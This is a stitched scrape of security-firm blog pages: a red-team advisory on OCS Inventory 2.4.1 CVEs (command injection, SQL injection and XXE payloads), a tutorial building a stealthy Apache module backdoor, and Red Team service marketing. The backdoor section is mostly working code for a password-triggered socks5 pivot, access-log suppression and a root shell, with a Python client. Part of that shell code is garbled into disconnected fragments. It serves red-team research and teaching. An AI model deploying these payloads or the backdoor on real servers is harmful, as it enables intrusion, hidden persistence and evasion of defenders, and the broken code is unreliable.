During a [Red Team operation](https://www.tarlogic.com/red-team-services/), multiple vulnerabilities were discovered in OCS Inventory (version 2.4.1). The following CVEs have been assigned to the vulnerabilities:

* CVE-2018-12482 (Multiple SQL Injections in the search engine)
* CVE-2018-12483 (Remote Command Execution)
* CVE-2018-14473 (XXE).

### Introduction

**OCS Inventory** is a inventory software widely used in corporations to monitor their computers via agents (for Linux and Windows) that are deployed inside the machines. The agents collect information from the computers and send it to a HTTP endpoint located in a master server. Likewise, in addition to monitoring, OCS Inventory allows the installation of software and the execution of OS commands from the master server to the computers where an agent is installed. Due to these capabilities, this product becomes a critical asset and therefore an asset of special interest for an attacker. If the OCS Inventory server gets compromised the attacker would be able deploy any kind of software inside the machines where an agent is deployed.

In the operation, the Red Team identified the existence of this software inside the client network, so, the logical procedure was to install a local copy of OCS Inventory to analyze it’s inner workings and to uncover vulnerabilities that could be used in the operation.

### CVE-2018-12483 – Remote Command Execution

When the code of “OCSReports” component is analyzed, the use of an external perl script for IP discovery is quickly observed:

```
function runCommand($command = "", $fname) {
    $command = "perl ipdiscover-util.pl $command -xml -h=" . SERVER_READ . " -u=" . COMPTE_BASE . " -p=" . PSWD_BASE . " -d=" . DB_NAME . " -path=" . $fname;
    exec($command);
}
```

The perl script is executed as a system command via exec() function, where it takes as argument a text string where the parameters have been concatenated. If we proceed to the search of references to this function within the source code, a unique match is identified:

```
//ms_ipdiscover_analyse.php

$pas = $protectedGet['rzo'];
$values = look_config_default_values(array('IPDISCOVER_IPD_DIR'), '', array('IPDISCOVER_IPD_DIR' => array('TVALUE' => VARLIB_DIR)));
$fname = $values['tvalue']['IPDISCOVER_IPD_DIR'];
$file_name = $fname . "/ipd/" . $pas . ".ipd";
//reset cache?
if (is_defined($protectedPost['reset'])) {
    unlink($file_name);
    reloadform_closeme('', true);
} else {
    if (!is_readable($file_name))
        runCommand("-cache -net=" . $pas, $fname);
```

The parameters provided to the runCommand function lack any filtering, so it is possible to abuse this functionality in order to execute arbitrary commands in the OS. Since we have the control of $pas (as it acquires its value from the GET parameter “rzo”), we can insert commands by the creation of a string like this one:

```
perl ipdiscover-util.pl -cache -net=;id > /tmp/pwned;#-xml -h=...
```

For the exploitation of this vulnerability it is necessary to be authenticated in the web platform, so if a valid user is not available another option is to hijack a session via the exploitation of any XSS from the myriad it has. In the context of the RedTeam exercise where the vulnerability was discovered, it was decided to force an authenticated user to load in their browser an image pointing to an URL with the payload (the browser sends a GET request with the malicious payload when the image is viewed).

### CVE-2018-12482 – Multiple SQL Injections

The search engine implemented in OCS Inventory does not perform an adequate filtering of the parameters used within SQL statements, making it possible to inject arbitrary SQL code. For highlighting some injection points:

* GET and POST parameter “values” when searching from the section “Inventory -> Search with various criteria data”. When you select a search tag (for example “Network: IPADDRESS”), the SQL statement remains such that:

```
select distinct HARDWARE_ID,networks.DESCRIPTION as 'Network: Description',networks.TYPE as 'Network: Type',networks.TYPEMIB as 'Network: MibType',networks.SPEED as 'Network: Speed',networks.MACADDR as 'Network: MAC Address',networks.STATUS as 'Network: Status',networks.IPADDRESS as 'Network: IP Address',networks.IPMASK as 'Network: IP Netmask',networks.IPSUBNET as 'Network: Subnetwork IP',networks.IPGATEWAY as 'Network: Gateway IP',networks.IPDHCP as 'Network: DHCP IP' from networks where ( ( IPADDRESS = '[INJECT HERE]'))

```

By not filtering properly, we can break the sentence with a single quote (‘) and inject our payload.

* Parameters length, order and start. These parameters used for the limit and order clauses of the SQL statement are not filtered properly, allowing the execution of arbitrary queries in the same way:

```
(Example: POST parameter length)
... GROUP BY netid) non_ident on non_ident.RSX=inv.RSX) toto order by ID asc limit 0 ,[inject here]
```
### CVE-2018-14473 – XXE

The communication between the agents and the master server of OCS Inventory is done through the HTTP protocol, sending the information against an endpoint. The information is structured in the form of XML, being parsed by the server to extract the data. Due to an inadequate configuration it is possible to use external entities, which when processed by the XML parser, allow the exfiltration of sensitive information from the machine.

As proof of concept, a local web server can be raised on the user’s machine, as a canary, and send the following request against the endpoint:

```
POST /ocsinventory HTTP/1.1
Host: xxxxxxxxxxxxxxx
User-Agent: OCS-NG_WINDOWS_AGENT_v2.3.1.1
Accept: */*
Content-Type: application/xml
Content-Length: 160
Expect: 100-continue
Connection: close
<?xml version="1.0" encoding=""UTF-8" ?>
<!DOCTYPE r [
      <!ELEMENT r ANY >
      <!ENTITY sp SYSTEM "https://ourserver/?pwned">
>
<REQUEST>&sp;</REQUEST>
```

When the XML is processed, the entity &sp; expands and the OCS Inventory server makes a request against our canary, verifying the existence of the vulnerability.

### Conclusion

One of the most standout characteristics of Tarlogic’s Red Team is It’s dedication to analyze the software used by It’s clients in order to find vulnerabilities that can be exploited in a real life scenario.These activities result in many occasions in the discovery of 0-days. Some of them that are found to be more interesting are shown in this blog (like the present post, or as was done with the [RCE of Cobian Backup](https://www.tarlogic.com/blog/cobian-backup-11-rce-cve-2017-11318/), and others are only reported to the pertinent authorities (as was done with the [Switch UbiQuoss VP5208A](https://www.tarlogic.com/blog/ubiquoss-switch-vulnerability-cve-2018-10024/)).

Always consider the possibility that an attacker uses unpublished vulnerabilities to compromise a machine. It is at this point where the measures implemented during the [systems hardening](https://www.tarlogic.com/operating-system-hardening/) phase should make lateral movement and escalation of privileges more difficult or even impossible. Likewise, the implementation of WAFs in this type of critical internal applications can prevent or make much more complicated to exploit this kind of vulnerabilities in web applications.

OCS Inventory has released a [new version](https://github.com/OCSInventory-NG/OCSInventory-ocsreports/releases/tag/2.5) (2.5) to fix the issues

Backdoors in XAMP stack (part III): Apache Modules

# Backdoors in XAMP stack (part III): Apache Modules

This third fascicle of the series about backdoors for web servers based on the XAMP stack (Apache2, MySQL, [PHP](https://www.tarlogic.com/cybersecurity-glossary/php/)), will focus on the development of modules for Apache2 in the context of a [Red Team operation](https://www.tarlogic.com/red-team-services/) . The use of modules and plugins for web servers as a method of persistence is an old and well-known tactic (example: [Linux / Cdorked.A 2013](https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/) ) that is still being used today.

The group [OilRig](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/) recently used a malicious module for IIS  as backdoor in different web servers in the Middle East ([RGDoor](https://attack.mitre.org/software/S0258/)). That is why, depending on the maturity level of the client, it is a persistence method to consider for the TTPs used during a Red Team operation.

In this article we will explore the creation of an [Apache](https://www.tarlogic.com/cybersecurity-glossary/apache/) module as proof of concept. The module will implement:

– A proxy socks5 to tunnel traffic from the outside to the internal network.

– Hiding HTTP logs.

– Execution of commands through a shell (root user).

All the code of the PoC will be uploaded to the repository at <https://github.com/TarlogicSecurity/mod_ringbuilder> .

### Introduction to Apache modules

Using Apache modules you can add and integrate new functionalities to a web server. Some examples of legitimate modules that can be found in a typical installation are mod\_ssl, mod\_php, etc. In this case, the module to develop will serve as a basic persistence to retake access to a compromised network, and as a tool during the intrusion.

When creating a module, Apache provides a series of hooks that allow defining code that will be executed in the different phases of the process. In this case we are interested in the following 3 hooks:

– ap\_hook\_post\_config. It is executed immediately after pairing the configuration and before the process reduces its privileges going from root to www-data (or similar).

– ap\_hook\_post\_read\_request. It executes the code after accepting the request and allows reading and / or modifying the content of it. Non-privileged user (www-data or similar).

– ap\_hook\_log\_transaction. Code that is executed when a request log is saved.

The hook “post\_config” will be used to host the code that will perform tasks requiring a privileged user. In the proof of concept that occupies this article, this hook will be used to obtain a shell with the root user. The next hook, “post\_read\_request”, will be responsible for parsing HTTP requests and locating if any action is requested to the backdoor. The last hook ,”log\_transaction”, will be the one used to prevent specific HTTP requests from being logged.

A minimum skeleton for the PoC would be the following:

```
static void ringbuilder_register_hooks(apr_pool_t *p){
  ap_hook_post_read_request((void *) ringbuilder_post_read_request, NULL, NULL, APR_HOOK_FIRST);
  ap_hook_post_config((void *) ringbuilder_post_config, NULL, NULL, APR_HOOK_FIRST);
  ap_hook_log_transaction(ringbuilder_log_transaction, NULL, NULL, APR_HOOK_FIRST);
}

module AP_MODULE_DECLARE_DATA ringbuilder_module = {
    STANDARD20_MODULE_STUFF,
    NULL,     /* create per-dir    config structures */
    NULL,     /* merge  per-dir    config structures */
    NULL,     /* create per-server config structures */
    NULL,     /* merge  per-server config structures */
    NULL,     /* table of config file commands       */
    ringbuilder_register_hooks  /* register hooks    */
};
```

It declares the information of the module (baptized as “ringbuilder”), and indicates the function in charge of performing the hooks registration (ringbuilder\_register\_hooks). When analyzing this function, we observe how it associates a proper function with a specific hook. The constant APR\_HOOK\_FIRST is used to indicate the priority order for the execution of the hook (Apache classifies the execution order of the loaded modules between the categories FIRST, MIDDLE and LAST), thus allowing this hook to be invoked before others in the queue.

The modules will be compiled and installed in this article using the apxs utility:

```
sudo apxs -i -a -c mod_ringbuilder.c && sudo service apache2 restart
```

The module is compiled through APXS, then the .so generated in the Apache modules folder is copied and the configuration file is modified to load it, adding the following line (apxs does it automatically, it is not necessary to perform this task, in a compromised server must be done manually):

```
LoadModule ringbuilder_module /usr/lib/apache2/modules/mod_ringbuilder.so
```
### Communicating with the backdoor

The communication with the backdoor will be made using the HTTP protocol itself in the first instance. To trigger a concrete action in a ringbuilder, for example, you can use the URI present in an HTTP request. Each action must be mapped with a different URI, in this case the following actions will be used:

```
#define SOCKSWORD "/w41t1ngR00M" //Fugazi
#define PINGWORD "/h0p3" //Descendents
#define SHELLWORD "/s4L4dD4ys" //Minor Threat
```

The URI in the HTTP request can be extracted from the “uri” field of the [request\_rec](https://ci.apache.org/projects/httpd/trunk/doxygen/structrequest__rec.html) structure , constructing something similar to the following in the function associated with the hook “post\_read\_request”:

```
static int ringbuilder_post_read_request(request_rec *r) {
  if (!strcmp(r->uri, SOCKSWORD)) {
      ...
  }

  if (!strcmp(r->uri, PINGWORD)) {
      ...
  }

  if (!strcmp(r->uri, SHELLWORD)) {
      ...
  }
  return DECLINED;
}
```

The return value of the function, in case the supplied URI does not match with any of the expected ones, is the constant DECLINED. With this return value, Apache notices that it is not interested in managing this request, and continues its processing through the following modules in the stack. This way the operation is not interrupted in any way, and the backdoor goes unnoticed (at behavior level).

However, in addition to using infrequent text strings to avoid collisions with legitimate HTTP requests, it is necessary to protect the backdoor with some kind of simple authentication such as a password. The ideal could be to use a common header (the User-Agent, for example), and check if a certain text string that acts as a password is in it. In this PoC a striking text string is used, but in a real operation, it would be better to use slight variation of a real User-Agent so that it goes unnoticed.

```
...
#define PASSWORD "1w4NN4b3Y0uRd0g" //Iggy Pop & The Stooges
...
static int ringbuilder_post_read_request(request_rec *r) {
  const apr_array_header_t *fields;
  apr_table_entry_t *e = 0;
  int i = 0;
  int backdoor = 0;

  fields = apr_table_elts(r->headers_in);
  e = (apr_table_entry_t *) fields->elts;
  for(i = 0; i < fields->nelts; i++) {
    if (!strcmp(e[i].key,"User-Agent")) {
      if (!strcmp(e[i].val, PASSWORD)) {
        backdoor = 1;
      }
    }
  }

  if (backdoor == 0) {
    return DECLINED;
  }

  ...
}
```

In this code fragment, all the headers present in the HTTP request are checked to see if the “User-Agent” header exists, and if so, its value is compared to the password we have defined. If not, the function returns the constant DECLINED and does not continue.

While this first HTTP request acts as a trigger for the backdoor, the rest of the communication will be performed by reusing the socket itself. This is tremendously interesting as it reduces the number of connections needed. On the other hand, it is not a viable method when the web server is behind a reverse proxy or a balancer; in these cases, it will be necessary to embed the communication within the HTTP protocol, using the body of POST requests to send the data to the backdoor and receive data from it through the content of the server responses (same mechanics that would be followed by a webshell, for example).

```
 ...
typedef struct sock_userdata_t sock_userdata_t;

typedef struct apr_socket_t {
    apr_pool_t *cntxt;
    int socketdes;
    int type;
    int protocol;
    apr_sockaddr_t *local_addr;
    apr_sockaddr_t *remote_addr;
    apr_interval_time_t timeout;
    int local_port_unknown;
    int local_interface_unknown;
    int remote_addr_unknown;
    apr_int32_t netmask;
    apr_int32_t inherit;
    sock_userdata_t *userdata;
} apr_socket_t;
...
static int ringbuilder_post_read_request(request_rec *r) {
  ...
  int fd;
  apr_socket_t *client_socket;
  extern module core_module;
  ...
  client_socket = ap_get_module_config(r->connection->conn_config, &core_module);
  if (client_socket) {
    fd = client_socket->socketdes; // Socket
  }
  ...
}
```

From this moment you can perform reads / writes over `fd` to communicate the client with the backdoor. What is written will be sent by the socket to the client, while the backdoor can obtain data from the client by reading it. As an example of this communication, the simplest function is shown: answer a PING request with a PONG to know that the server is still infected.

```
if (!strcmp(r->uri, PINGWORD)) {
  write(fd, "Alive!", strlen("Alive!"));
  exit(0);
}
```

When using an exit(), instead of returning DECLINED as done previously, it is possible to avoid the process continuing and reaching the point of logging the request.

For the client that will interact with the backdoor, a small python script can be used, whose skeleton is similar to:

```
def connector(endpoint):
  ringbuilder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  try:
    ringbuilder.connect((args.host, int(args.port)))
  except socket.error as err:
    if err.args[0] in (EINPROGRESS, EWOULDBLOCK):
      pass
    else:
      print "t[!] Error: could not connect to ringbuilder. Host or port wrong?"
      print err
      return
  ringbuilder.send("GET " + endpoint + " HTTP/1.1rnHost: " + args.host + "rnUser-Agent: " + args.passwd + "rnrn")
  return ringbuilder

def ping():
         ringbuilder = connector("/h0p3")
         if (ringbuilder.recv(1024) == "Alive!"):
                 print "[+] RingBuilder is installed"
         else:
                 print "[-] RingBuilder is NOT installed"

parser = argparse.ArgumentParser(description='RingBuilder Client.')
parser.add_argument('--host', dest='host', help='RingBuilder Endpoint Host')
parser.add_argument('--port', dest='port', help='RingBuilder Endpoint Port')
parser.add_argument('--password', dest='passwd', help='RingBuilder Password')
parser.add_argument('--ping', dest='ping', action='store_true', help='Check if backdoor still alive')
args = parser.parse_args()

if __name__ == '__main__':

  if not args.host or not args.port or not args.passwd:
    print "[!] Error: please provide a valid endpoint and password (use -h to check syntax)"
    exit(-1)

  if args.ping:
      ping()
```
[![Checking if apache module is installed](data:image/gif;base64...)](https://www.tarlogic.com/wp-content/uploads/2019/05/apache-module-ringbuilder-ping.png) Apache module alive

The rest of the proof of concept will be built from these code skeletons.

### Tunneling traffic

The first desirable functionality for the Apache module in a Red Team operation, is the possibility of functioning as a pivoting point from which to tunnel traffic towards the internal networks of the client. The simplest method to achieve this purpose is to implement a proxy socks5 in the module, and use local proxychains to forward the traffic of the tools towards the desired assets. In order to avoid the reinvention of the wheel you can use some previous implementation of Socks5, for example this https://github.com/fgssfgss/socks\_proxy where you only have to adapt the code of the function `app\_thread\_process` onwards, leaving something like:

```
...//Check github repo to see all code
void *worker(int fd) {
  int inet_fd = -1;
  int command = 0;
  unsigned short int p = 0;

  socks5_invitation(fd);
  socks5_auth(fd);
  command = socks5_command(fd);
  if (command == IP) {
    char *ip = NULL;
    ip = socks5_ip_read(fd);
    p = socks5_read_port(fd);
    inet_fd = app_connect(IP, (void *)ip, ntohs(p), fd);
    if (inet_fd == -1) {
      exit(0);
    }
    socks5_ip_send_response(fd, ip, p);
    free(ip);
    }

  app_socket_pipe(inet_fd, fd);
  close(inet_fd);
  exit(0);
}

static int ringbuilder_post_read_request(request_rec *r) {
  int fd;
  apr_socket_t *client_socket;
  extern module core_module;

  const apr_array_header_t *fields;
  int i = 0;
  apr_table_entry_t *e = 0;
  int backdoor = 0;

  fields = apr_table_elts(r->headers_in);
  e = (apr_table_entry_t *) fields->elts;
  for(i = 0; i < fields->nelts; i++) {
    if (!strcmp(e[i].key,"User-Agent")) {
      if (!strcmp(e[i].val, PASSWORD)) {
        backdoor = 1;
      }
    }
  }

  if (backdoor == 0) {
    return DECLINED;
  }

  client_socket = ap_get_module_config(r->connection->conn_config, &core_module);
  if (client_socket) {
    fd = client_socket->socketdes;
  }
  ...
  if (!strcmp(r->uri, SOCKSWORD)) {
    worker(fd);
    exit(0);
  }
  ...
return DECLINED
}
```

This way the client should send an HTTP request whose URI is the one defined in SOCKSWORD (in this case, “/w41t1ngR00M”) and reuse the socket to communicate proxychains with ringbuilder. In order to make the connection between both, a small functionality that acts as a “bridge” can be added to the script. This “bridge” would be responsible for establishing a listening socket in a local port (which would be configurable in proxychains), and another socket connected to Ringbuilder, making a relay between both.

```
def worker(afference, addr):
  print "t[*] New Connection!"
  print "t[*] Trying to reach RingBuilder..."
  ringbuilder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  ringbuilder.setblocking(0)
  try:
    ringbuilder.connect((args.host, int(args.port)))
  except socket.error as err:
    if err.args[0] in (EINPROGRESS, EWOULDBLOCK):
      pass
    else:
      print "t[!] Error: could not connect to ringbuilder. Host or port wrong?"
      print err
      return
  if args.debug:
    print "t[+] Connected to RingBuilder!"
        if args.socks5:
                path = "/w41t1ngR00M"

  ringbuilder.send("GET " + path + " HTTP/1.1rnHost: " + args.host + "rn" + "User-Agent: " + args.passwd + "rnrn")
  afference.setblocking(0)
  while True:
    readable, writable, errfds = select.select([afference, ringbuilder], [], [], 60)
    for sock in readable:
      if sock is afference:
        message = afference.recv(2048)
        if len(message) == 0:
          print "t[x] Service disconnected!"
          return
        if args.debug:
          print "tt--> Service"
          print message.encode("hex")
        ringbuilder.sendall(message)
      if sock is ringbuilder:
        data = ringbuilder.recv(2048)
        if len(data) == 0:
          print "t[x] RingBuilder disconnected!"
          return
        if args.debug:
          print "tt<-- RingBuilder"
          print data.encode("hex")
        afference.sendall(data)

def relay():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        if args.socks5:
            point = int(args.socks5)

        s.bind(("0.0.0.0",point))
    except Exception as err:
        print "[!] Error: could not bind to port"
  print err
        exit(0)

    s.listen(10)
    while True:
        clientsock, addr = s.accept()
        thread.start_new_thread(worker, (clientsock, addr))

def ping():
         ringbuilder = connector("/h0p3")
         if (ringbuilder.recv(1024) == "Alive!"):
                 print "[+] RingBuilder is installed"
         else:
                 print "[-] RingBuilder is NOT installed"

parser = argparse.ArgumentParser(description='RingBuilder Client.')
parser.add_argument('--host', dest='host', help='RingBuilder Endpoint Host')
parser.add_argument('--port', dest='port', help='RingBuilder Endpoint Port')
parser.add_argument('--password', dest='passwd', help='RingBuilder Password')
parser.add_argument('--socks5', dest='socks5', help='Set port for proxychains')
parser.add_argument('--debug', dest='debug', action='store_true', help='Enable debug mode')
parser.add_argument('--ping', dest='ping', action='store_true', help='Check if backdoor still alive')
args = parser.parse_args()

if __name__ == '__main__':

  if not args.host or not args.port or not args.passwd:
    print "[!] Error: please provide a valid endpoint and password (use -h to check syntax)"
    exit(-1)
  if args.socks5:
    print "[+] Starting local server for incoming connections at port " + args.socks5
    relay()
  if args.ping:
      ping()
```

Proxychains are configured to use any port (/etc/proxychains.conf). This way, for example, it is possible to launch a curl from the outside that will reach the ringbuilder, and from it to an objective of the internal network of the client:

### Avoiding logs

Another possible use of this Apache module can be, for example, hiding those activities that are carried out on the web server. If the backdoor is deployed as a persistence mechanism, the ideal is to take advantage of its more passive features (ie, not use it directly as a proxy or to execute commands), such as hiding traces of the activity. If webshells or other web utilities are deployed on that server and you do not want their use to be reflected in the access.log, it is possible to use a hook that executes an exit(0) before inserting the log line if the User-Agent corresponds to our password.

```
...
static int ringbuilder_log_transaction(request_rec *r) {
  const apr_array_header_t *fields;
    int i;
    apr_table_entry_t *e = 0;

  int backdoor = 0;

  fields = apr_table_elts(r->headers_in);
  e = (apr_table_entry_t *) fields->elts;
  for(i = 0; i < fields->nelts; i++) {
    if (!strcmp(e[i].key,"User-Agent")) {
      if (!strcmp(e[i].val, PASSWORD)) {
        backdoor = 1; //Exit() Could be here, but maybe we want to do other things like spoofing
      }
    }
  }

  if (backdoor == 0) {
    return DECLINED;
  }
  exit(0);
}
...
```

This way, when interacting with the web server, you must use a proxy (burp, for example) to replace the User-Agent with the one used as a password.

### Shell as root

The last feature that this backdoor in the form of an Apache module will have, is that of executing commands as a privileged user. As mentioned at the beginning of this article, to execute code as a privileged user the “post\_config” hook can be used, since it is invoked before transferring the process of the root user to www-data (or equivalent). The only obstacle that must be overcomed with this approach, is the fact that this hook is only executed when loading the process configuration, and not every time the server processes a new request. One possible approach (and it will be used in this proof of concept) is to use the hook “post\_config” to fork the process: the father continues its natural execution flow (it becomes www-data and processes the requests), while the son (which continues to belong to root) enters a loop waiting for orders received through some IPC.

The IPC chosen to carry out the communication between processes is going to be a UNIX socket because of its simplicity. The “child” process that is still running as root is going to be bound to the UNIX socket and listening for new connections. When a new HTTP request arrives, whose URI corresponds to the word that will trigger the “give me shell” action, it will connect to the socket and send a specific word (for example “SHELL”). When detecting this word, the child process (“root”) will be forked and will execute a /bin/bash where the STDIN, STDOUT and STDERR are associated to the socket of the new connection.

```
...
#define IPC "/tmp/mod_ringbuilder"
...
ringbuilder_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
  pid = fork();

  if (pid) {
    return OK;
  }

  int master, i, rc, max_clients = 30, clients[30], new_client, max_sd, sd;
  struct sockaddr_un serveraddr;
  char buf[1024];
  fd_set readfds;

  for (i = 0; i < max_clients; i++) {
    clients[i] = 0;
  }

  master = socket(AF_UNIX, SOCK_STREAM, 0);
  if (sd < 0) {
    exit(0);
  }
  memset(&serveraddr, 0, sizeof(serveraddr));
  serveraddr.sun_family = AF_UNIX;
  strcpy(serveraddr.sun_path, IPC);
  rc = bind(master, (struct sockaddr *)&serveraddr, SUN_LEN(&serveraddr));
  if (rc < 0) {
    exit(0);
  }
  listen(master, 5);
  chmod(serveraddr.sun_path, 0777);
  while(1) {
    FD_ZERO(&readfds);
    FD_SET(master, &readfds);
    max_sd = master;

    for (i = 0; i < max_clients; i++) { sd = clients[i]; if (sd > 0) {
        FD_SET(sd, &readfds);
      }
      if (sd > max_sd) {
        max_sd = sd;
      }
    }
    select (max_sd +1, &readfds, NULL, NULL, NULL);
    if (FD_ISSET(master, &readfds)) {
      new_client = accept(master, NULL, NULL);
      for (i = 0; i < max_clients; i++) {
        if (clients[i] == 0) {
          clients[i] = new_client;
          break;
        }
      }
    }

    for (i = 0; i < max_clients; i++) {
      sd = clients[i];
      if (FD_ISSET(sd, &readfds)) {
        memset(buf, 0, 1024);
        if ((rc = read(sd, buf, 1024)) <= 0) {
          close(sd);
          clients[i] = 0;
        }
        else  {
          if (strstr(buf, "SHELL")){
            shell(sd);
          }
        }
      }
    }
  }
}

        exit(0);
      }
      server.sun_family = AF_UNIX;
      strcpy(server.sun_path, IPC);

                }

        }
      }

Being a proof of concept, a shell without pseudo-terminal has been implemented. In case you want to execute commands in a shell with a TTY, you can use forkpty() in the same way that was explained in the article [on how to obtain an interactive shell through Bluetooth](https://www.tarlogic.com/blog/interactive-shell-via-bluetooth/).

### Conclusions

When a user raises privileges on a compromised server, the variety of ways through which he can maintain persistence in it is huge. During the interactions between Blue and Red Team, according to the level of maturity, it is important to gradually include different TTPs that allow to simulate the different scenarios that can be found in a real intrusion.

The complete proof of concept code is uploaded at <https://github.com/TarlogicSecurity/mod_ringbuilder> .

Red Team services

## Red Teaming Services

The mission of the **Red Team** in cybersecurity is to simulate a sponsored external agent performing unauthorized access to corporate systems. This involves not only classic intrusion but also long-term persistence, privilege escalation within corporate systems, and even the alteration and theft of strategic business information.

During their execution, **Red Team services** continuously assess the detection and response capabilities of the security team (**Blue Team**), simulating the actions of a hostile actor and testing defenses against a real attack.

Attack scenarios can be designed and guided by threat intelligence (TLPT), as defined by the **TIBER** and **DORA** framework, providing these exercises with increased realism.

## Benefits of Red Team services

**Red Team services** help detect and contain a **penetration event at an early stage** which results in preventing strategic information theft and corporate system down-time. This goal is gradually achieved thanks to:

### Detection of the company’s transversal weaknesses.

* Verifies the real impact of a cyberattack against your company by executing offensive cybersecurity exercises led by a threat intelligence team.

### Improvement and strengthening of response procedures

* Helps rapidly evolve the capabilities of the defensive team, allowing them to more effectively combat real situations they may potentially face in the future.

### Improvement of monitoring systems

* Reveals which suspicious activities have not been detected by monitoring systems, identifying and resolving weaknesses in the event detection and analysis process.

### Training of security personnel

* Trains security personnel to respond to real incidents by thoroughly analyzing the intrusion in joint working sessions between the offensive and defensive teams.

## How the Red Team Service is Carried Out

The BlackArrow team designs a complete attack scenario, defining the starting point and milestones to achieve during the intrusion execution, and carries it out without the knowledge of the company's cybersecurity team.

* **Asset Identification:** We discover and map assets, applications, and technologies used.
* **Simulation of Real Attacks:** We identify high-impact vulnerabilities and test them to see how the defenses would respond to different types of threats.
* **Continuous Improvement:** We not only detect failures but also offer specific solutions to strengthen security as we advance in intrusion and persistence within the network.
* **Regulatory Adaptation:** We help your company comply with industry-required regulations and security standards, enhancing its cyber resilience.

From Perimeter Breach to Ransomware Simulation

## Red Team Scenarios

**Red Team Scenarios** mimic threat actors like Remote Attackers, Malicious Employees or Ransomware Simulation among others.

Companies are continuously exposed to threat actors or adversaries that can introduce risks in several ways. According to that context, our Red Team simulates threat actors or adversaries looking for a particular objective. That is what it is called a Red Team Scenario.

The following table illustrates some alternatives that could be used to define the most suitable Red Team Scenario for a particular exercise:

Threat Actors

* Remote attacker
* Compromised Third Party or collaborator
* Compromised or disgruntled employee
* Competitors
* Activist / Terrorist
* Any other threat actors to be agree with our Clients

Intrusion vectors

* Vulnerability exploitation
* Social Engineering (including phishing)
* Password guessing
* WiFi or Ethernet
* Remote Access or VPN
* Leaked information (including user accounts)

Objectives

* Privilege escalation
* Targeted compromise (ERP, Treasury, OT, SCADA)
* Deploy Ransomware
* Leak sensitive information
* Leak/manipulate/sabotage products (software, patents)
* Force payments
* Any other objective to be agreed with our Clients

![red team scenarios](data:image/gif;base64...)

## Red team scenarios examples

In fact, like a real threat actor, **Red Teaming services** can simulate multiple scenarios to maximize success.

By choosing the most relevant Threat Actors and Objectives, it is possible to define particular **Red Teaming Scenarios** that can be found in a real environment. The following scenarios are only representative examples of what it can be found in a real environment:

* A **competitor** using a **leaked user account** to access **sensitive information** (**patents**)
* An **activist** trying to exploit a vulnerability to access **SCADA** infrastructure and perform **sabotage** activities
* A **disgruntled employee** collaborating to perform a malicious **payment to a third party account**
* A **partner** accessing corporate services, leads to a major compromise of **deploying ransomware**

## Ransomware simulation

This list is endless, and any realistic scenario could be reproduced as a Red Team Scenario

It is important to note that Red Teaming is much more than a Red Team scenario, but **Ransomware Simulation exercises**have gained some attention in the last few months. As ransomware attacks are becoming more frequent and sophisticated, organizations are increasing their effort to face any potential ransomware attack. Frequent questions clients ask us:

* Is my organization prepared to face a ransomware attack?
* Would my defensive layers identify, contain and recover from a targeted ransomware attack?
* Does my organization have experience to learn from other ransomware attacks and learn lessons from that experience?

![ransomware simulation test](data:image/gif;base64...)

![red team cyber security exercises](data:image/gif;base64...)

## Resilience in front of a ransomware attack

In the case that some of your answers were “no”, you may consider performing a Red Team Scenario focused on **Ransomware** Simulation exercises. In the particular case of Ransomware **Simulation exercises** we suggest two differentiated stages:

1. **Red Team Scenario**: Performing activities included in a Ransomware Simulation exercise by replicating a realistic targeted ransomware attack.
2. **Gap-Analysis**.: One **advisor** analyzes how our client defensive layers have detected, contained and recovered assets during the Red Team Scenario identifying improvement possibilities you can implement.

## Red team FAQs

### What is a Red Team exercise?

A Red Team exercise is the design and execution of an offensive operation aimed to **simulate a certain Malicious Actor.** This can verify the organization’s defensive layers and identify not only high/critical risk vulnerabilities but also **testing the real detection and response capabilities** provided by the organization.

### What is the difference between pentesting and red teaming?

While a [penetration test](https://www.tarlogic.com/penetration-testing-services/) usually is constrained to a particular scope and focuses mainly on vulnerabilities, **a red team service should not have a limited scope** but at the same time maintain focus on resilience rather than on vulnerabilities.

Under that context the outcome of a red team exercise should be a representation about how well an organization is prepared to face a certain Malicious Actor.

### How long does it take to conduct a red teaming service?

It depends on the designed exercise. Typically, an exercise without any previous information about an organization, could take a **minimum of 3 months** to obtain results. This however will represent the real situation of the defensive layers. Meanwhile other exercises starting with a certain level of access to internal resources could require less time.

Mature organizations tend to hire continuous red teaming operations, allowing them to perform **several exercises during the year**.

### Could a red team service cause any damage or disruption?

As any other offensive service, a red team exercise could lead to undesirable situations including damage or disruption. That is the reason why risk management is a key component of Red Teaming, including not only an **extremely experienced and accurated team** but also insurance policies to be covered for those unexpected situations.

### How does a red team versus blue team exercise help an organization?

During a Red Team exercise Blue Team technology, procedures and people can be trained to test if the defensive layers are working as expected.

Once a **Red Team** exercise has been completed, establishing working sessions with the Blue Team can help organizations to identify areas of improvement as well as sharing experiences to be prepared in the future.
